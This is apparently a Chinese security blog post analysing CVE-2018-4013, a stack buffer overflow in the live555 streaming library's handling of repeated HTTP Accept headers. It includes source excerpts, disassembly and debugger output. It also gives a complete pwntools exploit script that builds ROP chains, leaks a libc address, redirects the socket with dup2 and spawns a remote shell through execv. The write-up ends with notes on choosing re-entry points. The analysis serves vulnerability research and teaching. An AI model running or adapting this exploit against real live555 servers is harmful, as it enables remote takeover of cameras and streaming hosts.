---
layout: post
title:  "live555栈溢出漏洞分析"
date:   2025-04-15 13:27:38 +0800
category: userspace
---
Live555 是一个开源的、跨平台的 C++ 库，主要用于实现 **RTSP/RTP/RTCP** 等流媒体协议的推流（Server）和拉流（Client）功能。它支持多种音视频格式（如 H.264、H.265、MP3、AAC 等），常用于 IP 摄像头、视频监控、直播等场景。

# 漏洞信息

Live555 是一个开源的、跨平台的 C++ 库，主要用于实现 **RTSP/RTP/RTCP** 等流媒体协议的推流（Server）和拉流（Client）功能。它支持多种音视频格式（如 H.264、H.265、MP3、AAC 等），常用于 IP 摄像头、视频监控、直播等场景。

漏洞编号：cve-2018-4013

效果：攻击者可以获取远程shell

内存控制能力：

- 没有NULL截断，可随意写入
- 栈上面的内容可控，无任何添加
- 溢出长度可控
- 没有内容过滤

# 漏洞分析

## 调用关系

![live555.jpg](/assets/posts/2025-04-15-live555栈溢出漏洞分析/live555.jpg)

## 漏洞原理

doEventLoop是处理网络输入的主逻辑，它是TaskScheduler对象的方法：

```c
int main(int argc, char** argv) {
  
  TaskScheduler* scheduler = BasicTaskScheduler::createNew();
  UsageEnvironment* env = BasicUsageEnvironment::createNew(*scheduler);
  ......
  env->taskScheduler().doEventLoop(); // does not return
}
```

handleRequestBytes解析http请求的头部，把cookie部分保存在sessionCookie数组，accept部分保存在acceptStr数组中，两个数组长度都是200字节，其中acceptStr数组是溢出对象。

```c
void RTSPServer::RTSPClientConnection::handleRequestBytes(int newBytesRead) {
	......
	char sessionCookie[200];
  char acceptStr[200];     //溢出对象
  *fLastCRLF = '\0'; 
  parseSucceeded = parseHTTPRequestString(cmdName, sizeof cmdName,
					      urlSuffix, sizeof urlPreSuffix,
					      sessionCookie, sizeof sessionCookie,
					      acceptStr, sizeof acceptStr);
	......
}
```

可以看到acceptStr数组到返回地址的距离是0x1c8，因为这里的栈变量是以rsp+0x6D8来索引的，也就是用的到返回地址的距离：

```bash
.text:0000000000407EE0 _ZN10RTSPServer20RTSPClientConnection18handleRequestBytesEi proc near
.text:0000000000407EE0                                         ; DATA XREF: .data.rel.ro:0000000000464F68↓o
.text:0000000000407EE0
.text:0000000000407EE0 var_6D8         = qword ptr -6D8h
.text:0000000000407EE0 tmpPtr          = qword ptr -6D0h
.text:0000000000407EE0 var_6C8         = qword ptr -6C8h
.text:0000000000407EE0 newBytesRead    = qword ptr -6C0h
.text:0000000000407EE0 reuseConnection = byte ptr -6ADh
.text:0000000000407EE0 contentLength   = dword ptr -6ACh
.text:0000000000407EE0 cmdName         = byte ptr -6A8h
.text:0000000000407EE0 urlPreSuffix    = byte ptr -5D8h
.text:0000000000407EE0 urlSuffix       = byte ptr -508h
.text:0000000000407EE0 cseq            = byte ptr -438h
.text:0000000000407EE0 sessionIdStr    = byte ptr -368h
.text:0000000000407EE0 sessionCookie   = byte ptr -298h
.text:0000000000407EE0 acceptStr       = byte ptr -1C8h     ; 到返回地址的距离为0x1c8
.text:0000000000407EE0
.text:0000000000407EE0 this = rdi                              ; RTSPServer::RTSPClientConnection *const
.text:0000000000407EE0 newBytesRead_0 = rsi                    ; int
.text:0000000000407EE0 ; __unwind {
.text:0000000000407EE0                 endbr64
.text:0000000000407EE4                 push    r15
.text:0000000000407EE6                 mov     r15, this
.text:0000000000407EE9                 push    r14
.text:0000000000407EEB                 push    r13
.text:0000000000407EED                 mov     r13d, esi
.text:0000000000407EF0                 push    r12
.text:0000000000407EF2                 push    rbp
.text:0000000000407EF3                 push    rbx
.text:0000000000407EF4                 sub     rsp, 6A8h
.text:0000000000407EFB                 add     dword ptr [this+9C90h], 1
.text:0000000000407F02                 mov     r9d, [this+9C68h]
.text:0000000000407F09                 test    esi, esi
.text:0000000000407F0B                 js      loc_4082C6
.text:0000000000407F11                 xor     eax, eax
.text:0000000000407F13 numBytesRemaining = rax                 ; int
.text:0000000000407F13                 mov     r12d, r13d
.text:0000000000407F16                 cmp     r13d, r9d
.text:0000000000407F19                 jnb     loc_4082C6
.text:0000000000407F1F this = r15                              ; RTSPServer::RTSPClientConnection *const
.text:0000000000407F1F newBytesRead_0 = r12                    ; int
.text:0000000000407F1F                 nop
.text:0000000000407F20
.text:0000000000407F20 loc_407F20:                             ; CODE XREF: RTSPServer::RTSPClientConnection::handleRequestBytes(int)+3E0↓j
.text:0000000000407F20                 mov     edx, [this+9C64h]
.text:0000000000407F27                 lea     rbx, [this+rdx+24h]
.text:0000000000407F2C ptr = rbx                               ; unsigned __int8 *
.text:0000000000407F2C                 movsxd  rdx, r13d
.text:0000000000407F2F                 mov     byte ptr [ptr+rdx], 0
.text:0000000000407F33                 test    eax, eax
.text:0000000000407F35                 jz      loc_408318
.text:0000000000407F3B                 sub     rsp, 8
.text:0000000000407F3F                 mov     rdi, cs:stderr@@GLIBC_2_2_5
.text:0000000000407F46                 mov     r9d, r13d
.text:0000000000407F49                 xor     eax, eax
.text:0000000000407F4B                 push    ptr
.text:0000000000407F4C                 lea     rdx, aRtspclientconn ; "RTSPClientConnection[%p]::handleRequest"...
.text:0000000000407F53                 mov     rcx, this
.text:0000000000407F56                 mov     esi, 1
.text:0000000000407F5B                 lea     r8, aProcessing ; "processing"
.text:0000000000407F62                 call    ___fprintf_chk
.text:0000000000407F67                 mov     r9d, [this+9CD8h]
.text:0000000000407F6E                 pop     rax
.text:0000000000407F6F                 pop     rdx
.text:0000000000407F70
.text:0000000000407F70 loc_407F70:                             ; CODE XREF: RTSPServer::RTSPClientConnection::handleRequestBytes(int)+482↓j
.text:0000000000407F70                                         ; RTSPServer::RTSPClientConnection::handleRequestBytes(int)+6B8↓j
.text:0000000000407F70                 test    r9d, r9d
.text:0000000000407F73                 jnz     short loc_407FE0
.text:0000000000407F75                 mov     rax, [this+9C88h]
.text:0000000000407F7C                 lea     rbp, [this+24h]
.text:0000000000407F80                 lea     r11, [rax+2]
.text:0000000000407F84                 movsxd  rax, r13d
.text:0000000000407F87                 cmp     rbp, r11
.text:0000000000407F8A                 mov     [rsp+6D8h+newBytesRead], rax
.text:0000000000407F8F                 lea     rax, [ptr+rax-1]
.text:0000000000407F94                 cmovnb  r11, rbp
```

acceptStr以参数透传的方式传递给漏洞lookForHeader：

```c
Boolean RTSPServer::RTSPClientConnection::parseHTTPRequestString(char* resultCmdName, unsigned resultCmdNameMaxSize,
								 char* urlSuffix, unsigned urlSuffixMaxSize,
								 char* sessionCookie, unsigned sessionCookieMaxSize,
								 char* acceptStr, unsigned acceptStrMaxSize) {
								 
  ......
  lookForHeader("x-sessioncookie", &reqStr[i], reqStrSize-i, sessionCookie, sessionCookieMaxSize);
  lookForHeader("Accept", &reqStr[i], reqStrSize-i, acceptStr, acceptStrMaxSize);
  
  return True;
}
```

漏洞的原因在于攻击者可以在一次http请求中构造多个accept字段，这多个accept字段都会被拷贝到acceptStr[200]数组中，而lookForHeader函数仅对单次拷贝Accept的长度做了限制不超过200：

```c
static void lookForHeader(char const* headerName, char const* source, 
						unsigned sourceLen, char* resultStr, unsigned resultMaxSize) {
  resultStr[0] = '\0';
  unsigned headerNameLen = strlen(headerName);
  for (int i = 0; i < (int)(sourceLen-headerNameLen); ++i) {
	  //循环解析"Accept:"字符串，可以解析多个Accept字段
    if (strncmp(&source[i], headerName, headerNameLen) == 0 && source[i+headerNameLen] == ':') 
    {
      //找到了accept头.  跳过空白和制表符
	    for (i += headerNameLen+1; i < (int)sourceLen && (source[i] == ' ' || source[i] == '\t'); ++i) {}
      for (unsigned j = i; j < sourceLen; ++j) {
				if (source[j] == '\r' || source[j] == '\n') {
			  // 字符串拷贝
				  if (j-i+1 > resultMaxSize) break;  //resultMaxSize限制为200, 但这个仅仅是针对单次
																						 //的复制过程，如果控制每个Accept字段长度不超过200
																						 //那么就可以反复拷贝造成溢出
				  // 标记源字符串中的拷贝起始位置
				  char const* resultSource = &source[i];
				  // 标记源字符串中的拷贝结束位置
				  char const* resultSourceEnd = &source[j];
				  // 位于下标 i,j之间的内容拷贝到acceptStr数组中
				  while (resultSource < resultSourceEnd) *resultStr++ = *resultSource++; //漏洞点
				  *resultStr = '\0';
				  break;
				}
      }
    }
  }
}
```

漏洞的效果是覆盖handleRequestBytes函数到incomingRequestHandle的返回地址。

## C++虚表函数调用

以doEventLoop函数的调用为例，该函数是TaskScheduler对象的方法，而 UsageEnvironment对象又包含了一个TaskScheduler对象：

```c
int main(int argc, char** argv) {
  
  TaskScheduler* scheduler = BasicTaskScheduler::createNew();
  UsageEnvironment* env = BasicUsageEnvironment::createNew(*scheduler);
  ......
  env->taskScheduler().doEventLoop(); // does not return
}
```

```c
class TaskScheduler {
	public:
	  virtual ~TaskScheduler();  // 析构函数
	  ......
	  virtual void moveSocketHandling(int oldSocketNum, int newSocketNum) = 0;
	  virtual void doEventLoop(char volatile* watchVariable = NULL) = 0;
	protected:
	  TaskScheduler(); // 构造函数
};

class UsageEnvironment {
	public:
	  Boolean reclaim();
	  TaskScheduler& taskScheduler() const {return fScheduler;}
	......

	protected:
	  UsageEnvironment(TaskScheduler& scheduler); // 构造函数
	  virtual ~UsageEnvironment(); // 析构函数

	private:
	  TaskScheduler& fScheduler;   // 包含了一个TaskScheduler对象,保存的是指针
};
     
```

从反汇编的角度来看env->taskScheduler().doEventLoop()调用过程：

```bash
.text:00000000004052DF loc_4052DF:                             ; CODE XREF: main+5D5↓j
.text:00000000004052DF    mov   rax, cs:env    ; 解引用env对象
.text:00000000004052E6    xor   esi, esi       ; env+0x18的位置保存TaskScheduler对象指针
.text:00000000004052E8    mov   rdi, [rax+18h] ; fScheduler对象地址作为第一个参数, this
.text:00000000004052EC    mov   rax, [rdi]     ; 对象的第一个8字节保存的函数虚表地址
.text:00000000004052EF    call  qword ptr [rax+38h] ; 虚表中index为7的槽位是doEventLoop函数指针
```

这段代码对应的F5：

可以看到this就是对象本身的指针，this默认作为方法的第一个参数传递给rdi寄存器，方法定义中的其他参数往后顺延。

![批注 2025-04-15 171433.png](/assets/posts/2025-04-15-live555栈溢出漏洞分析/%E6%89%B9%E6%B3%A8_2025-04-15_171433.png)

观察数据结构可以看到UsageEnvironment对象和TaskScheduler对象的第0个字节都是虚表指针。

UsageEnvironment对象偏移0x18字节的位置保存了TaskScheduler对象的指针。

每一次对象方法的调用都是以对象的地址作为this指针，传递给rdi寄存器，作为对象方法的第一个参数。

```bash
00000000 UsageEnvironment struc ; (sizeof=0x20, align=0x8, copyof_37)
00000000                                         ; XREF: BasicUsageEnvironment0/r
00000000 _vptr_UsageEnvironment dq ?             ; offset
00000008 liveMediaPriv   dq ?                    ; offset
00000010 groupsockPriv   dq ?                    ; offset
00000018 fScheduler      dq ?                    ; offset
00000020 UsageEnvironment ends
00000020
00000000 ; ---------------------------------------------------------------------------
00000000
00000000 TaskScheduler   struc ; (sizeof=0x8, align=0x8, copyof_44)
00000000 _vptr_TaskScheduler dq ?                ; offset
00000008 TaskScheduler   ends
00000008
```

函数虚表是被硬编码在可执行文件中的，其中包含了对象的类型信息和函数指针表。

函数指针表的位置是从0x46AA08开始，该地址保存在对象中，作为方法调用时候的索引基地址，也就是每个对象开头的8个字节：

```c
data.rel.ro:000000000046A9F8 ; `vtable for'BasicTaskScheduler
.data.rel.ro:000000000046A9F8 _ZTV18BasicTaskScheduler dq 0           ; offset to this
.data.rel.ro:000000000046AA00                 dq offset _ZTI18BasicTaskScheduler ; `typeinfo for'BasicTaskScheduler
.data.rel.ro:000000000046AA08 off_46AA08      dq offset _ZN18BasicTaskSchedulerD2Ev
.data.rel.ro:000000000046AA08                                         ; DATA XREF: BasicTaskScheduler::~BasicTaskScheduler()+4↑o
.data.rel.ro:000000000046AA08                                         ; BasicTaskScheduler::~BasicTaskScheduler()+4↑o ...
.data.rel.ro:000000000046AA08                                         ; BasicTaskScheduler::~BasicTaskScheduler()
.data.rel.ro:000000000046AA10                 dq offset _ZN18BasicTaskSchedulerD0Ev ; BasicTaskScheduler::~BasicTaskScheduler()
.data.rel.ro:000000000046AA18                 dq offset _ZN19BasicTaskScheduler019scheduleDelayedTaskElPFvPvES0_ ; BasicTaskScheduler0::scheduleDelayedTask(long,void (*)(void *),void *)
.data.rel.ro:000000000046AA20                 dq offset _ZN19BasicTaskScheduler021unscheduleDelayedTaskERPv ; BasicTaskScheduler0::unscheduleDelayedTask(void *&)
.data.rel.ro:000000000046AA28                 dq offset _ZN13TaskScheduler21rescheduleDelayedTaskERPvlPFvS0_ES0_ ; TaskScheduler::rescheduleDelayedTask(void *&,long,void (*)(void *),void *)
.data.rel.ro:000000000046AA30                 dq offset _ZN18BasicTaskScheduler21setBackgroundHandlingEiiPFvPviES0_ ; BasicTaskScheduler::setBackgroundHandling(int,int,void (*)(void *,int),void *)
.data.rel.ro:000000000046AA38                 dq offset _ZN18BasicTaskScheduler18moveSocketHandlingEii ; BasicTaskScheduler::moveSocketHandling(int,int)
.data.rel.ro:000000000046AA40                 dq offset _ZN19BasicTaskScheduler011doEventLoopEPVc ; BasicTaskScheduler0::doEventLoop(char volatile*)
.data.rel.ro:000000000046AA48                 dq offset _ZN19BasicTaskScheduler018createEventTriggerEPFvPvE ; BasicTaskScheduler0::createEventTrigger(void (*)(void *))
.data.rel.ro:000000000046AA50                 dq offset _ZN19BasicTaskScheduler018deleteEventTriggerEj ; BasicTaskScheduler0::deleteEventTrigger(uint)
.data.rel.ro:000000000046AA58                 dq offset _ZN19BasicTaskScheduler012triggerEventEjPv ; BasicTaskScheduler0::triggerEvent(uint,void *)
.data.rel.ro:000000000046AA60                 dq offset _ZN16UsageEnvironment13internalErrorEv ; UsageEnvironment::internalError(void)
.data.rel.ro:000000000046AA68                 dq offset _ZN18BasicTaskScheduler10SingleStepEj ; BasicTaskScheduler::SingleStep(uint)
```

通过调试进一步验证了上述猜想，TaskScheduler对象的地址为0x158fdeb0，该地址位于堆，说明对象是动态分配在堆上面的。

对象的第一个8字节是指向虚表中的函数指针表的指针，值为0x46aa08，与反汇编结果一致。

函数指针表中偏移0x38的位置就是doEventLoop函数的地址，与反汇编结果一致。

```bash
──────────────────────────────[ BACKTRACE ]────────────────────────────────────
 ► 0         0x441bc0 BasicTaskScheduler0::doEventLoop(char volatile*)
   1         0x4052f2 main+1218
   2              0x0 None
───────────────────────────────────────────────────────────────────────────────
#0  BasicTaskScheduler0::doEventLoop (this=0x158fdeb0, watchVariable=0x0) at BasicTaskScheduler0.cpp:76
#1  0x00000000004052f2 in main (argc=<optimized out>, argv=<optimized out>) at live555ProxyServer.cpp:263
#2  0x0000000000000000 in ?? ()
pwndbg> x/16xw this                 // 观察TaskScheduler对象, 0x46aa08指向虚表
0x158fdeb0:     0x0046aa08      0x00000000      0x00464ba8      0x00000000
0x158fdec0:     0x15904050      0x00000000      0x15904000      0x00000000
0x158fded0:     0x7fffffca      0x00000000      0x0001789a      0x00000000
0x158fdee0:     0x00000001      0x00000000      0x67fe29e2      0x00000000
pwndbg> x/32xg 0x0046aa08           // 观察虚表, 里面都是函数指针
0x46aa08 <_ZTV18BasicTaskScheduler+16>: 0x000000000043fec0      0x000000000043fee0
0x46aa18 <_ZTV18BasicTaskScheduler+32>: 0x0000000000441dc0      0x0000000000441e60
0x46aa28 <_ZTV18BasicTaskScheduler+48>: 0x0000000000442300      0x000000000043ff10
0x46aa38 <_ZTV18BasicTaskScheduler+64>: 0x0000000000440050      0x0000000000441bc0
0x46aa48 <_ZTV18BasicTaskScheduler+80>: 0x0000000000441c00      0x0000000000441ea0
0x46aa58 <_ZTV18BasicTaskScheduler+96>: 0x0000000000441c70      0x0000000000404e22
0x46aa68 <_ZTV18BasicTaskScheduler+112>:        0x00000000004402d0      0x00007f89e8a85008
```

# 漏洞利用

首先开启服务端程序，live555会在本机8000端口监听：

```bash
$ ./live555ProxyServer rtsp://127.0.0.1
LIVE555 Proxy Server
        (LIVE555 Streaming Media library version 2018.08.28; licensed under the GNU LGPL)

Created new TCP socket 4 for connection
RTSP stream, proxying the stream "rtsp://127.0.0.1"
        Play this stream using the URL: rtsp://192.168.141.128:8554/proxyStream

(We use port 8000 for optional RTSP-over-HTTP tunneling.)
Created new TCP socket 4 for connection
Created new TCP socket 4 for connection
```

漏洞利用代码：

```python
#!/usr/bin/python 

# ./exp.py 127.0.0.1 8000

import sys
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'

pop_rdi_ret = 0x405301
pop_rsi_ret = 0x406277
pop_rdx_rbx_ret = 0x424b50
pop_rcx_ret = 0x415bb5
re_enter = 0x4052DF
send_plt = 0x403560   # ssize_t send(int sockfd, const void *buf, size_t len, int flags);
strncmp_got = 0x46B080
dup2_off = 0x10EAE0
execv_off = 0xE32D0
sh_off = 0x1B45BD
offset = 0x184230

def genHeader(raw):
    header = '''
GET / HTTP/1.1\r\n
Host: 127.0.0.1:8000\r\n
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0\r\n
Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3\r\n
Accept-Encoding: gzip, deflate\r\n
Connection: keep-alive\r\n
Upgrade-Insecure-Requests: 1\r\n
'''
    header += "Accept:"
    header = header.encode()
    chunks = [raw[i:i+50] for i in range(0, len(raw), 50)]
    if chunks:
        header += "\r\nAccept:".encode().join(chunks)  # Join chunks with delimiter
    
    # End the header
    header += "\r\n\r\n".encode()
    return header

def exploit(p:remote, payload):
    raw = genHeader(payload)
    p.sendline(raw)

if len(sys.argv) < 3:
        print("usage: python cve-2018-4013.py IP PORT")
        exit()

rp = remote(sys.argv[1], int(sys.argv[2]))          # 127.0.0.1:8000

# 泄露strncmp地址
payload = b'a'*0x1c8 + p64(pop_rdi_ret) + p64(4) + \
            p64(pop_rsi_ret) + p64(strncmp_got) + \
            p64(pop_rdx_rbx_ret) + p64(8) + p64(0) + \
            p64(pop_rcx_ret) + p64(0) + \
            p64(send_plt) + \
            p64(re_enter)

exploit(rp, payload)
strncmp_addr = u64(rp.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
print("strncmp: " + hex(strncmp_addr))

libc_base = strncmp_addr - offset
print('libc base: ' + hex(libc_base))

dup2_addr = dup2_off + libc_base
print("dup2: " + hex(dup2_addr))

execv_addr = execv_off + libc_base
print("execv: " + hex(execv_addr))

sh_addr = sh_off + libc_base
print("sh string: " + hex(sh_addr))

# 输入输出重定向
payload = b'a'*0x1c8 + p64(pop_rdi_ret) + p64(4) + \
            p64(pop_rsi_ret) + p64(0) + \
            p64(dup2_addr) + \
            p64(pop_rdi_ret) + p64(4) + \
            p64(pop_rsi_ret) + p64(1) + \
            p64(dup2_addr) + \
            p64(re_enter)

exploit(rp, payload)

# 起一个shell
payload = b'a'*0x1c8 + p64(pop_rdi_ret) + p64(sh_addr) + \
            p64(pop_rsi_ret) + p64(0) + \
            p64(pop_rdx_rbx_ret) + \
            p64(0) + p64(0) + \
            p64(execv_addr)

exploit(rp, payload)

rp.interactive()

```

# 重入位置怎么找

## 环境准备的问题

如果我们仅仅跳到doEventLoop函数的地址，那么肯定会崩溃，因为不满足两个条件：

- rdi没有指向TaskScheduler对象的地址，实测发现rdi=1
- rsi不等于0，也就是watchVariable参数不为0，那么while(1)循环就继续不下去

```bash
void BasicTaskScheduler0::doEventLoop(char volatile* watchVariable) {
  while (1) {
    if (watchVariable != NULL && *watchVariable != 0) break;
    SingleStep();
  }
}
```

所以我们选择跳转到main函数调用doEventLoop的位置：

```c
int main(int argc, char** argv) {
  
  TaskScheduler* scheduler = BasicTaskScheduler::createNew();
  UsageEnvironment* env = BasicUsageEnvironment::createNew(*scheduler);
  ......
  env->taskScheduler().doEventLoop(); //选择这里作为重入点
}
```

因为这一块完成了进入doEventLoop之前的环境初始化，满足了rdi和rsi寄存器的条件。

```bash
.text:00000000004052DF loc_4052DF:                             ; CODE XREF: main+5D5↓j
.text:00000000004052DF    mov   rax, cs:env    ; 解引用env对象
.text:00000000004052E6    xor   esi, esi       ; env+0x18的位置保存TaskScheduler对象指针
.text:00000000004052E8    mov   rdi, [rax+18h] ; fScheduler对象地址作为第一个参数, this
.text:00000000004052EC    mov   rax, [rdi]     ; 对象的第一个8字节保存的函数虚表地址
.text:00000000004052EF    call  qword ptr [rax+38h] ; 虚表中index为7的槽位是doEventLoop函数指针
```

## 寄存器对齐问题

有些函数在中间一些步骤要确保rsp寄存器16字节对齐，否则会报段错误。

这个要根据具体的情况调试确定在重入之前rsp是8字节对齐还是16字节对齐。

在[torque栈溢出漏洞分析](https://www.notion.so/torque-2-5-13-1cf3f4b7819d8064a26ee66740a68cfa?pvs=21)过程中发现了这个问题，因为rsp没有16字节对齐而导致snprintf函数段错误

总结一些重入点的选择方法：

- 要选择函数实际调用的位置作为重入点，而非函数定义的位置；
- 在调用路径上选择重入点，尽量选择不带参数的函数，因为一旦带了参数就涉及到更加复杂的参数问题。不带参数的函数说明用的都是全局变量，栈溢出不会破坏全局变量；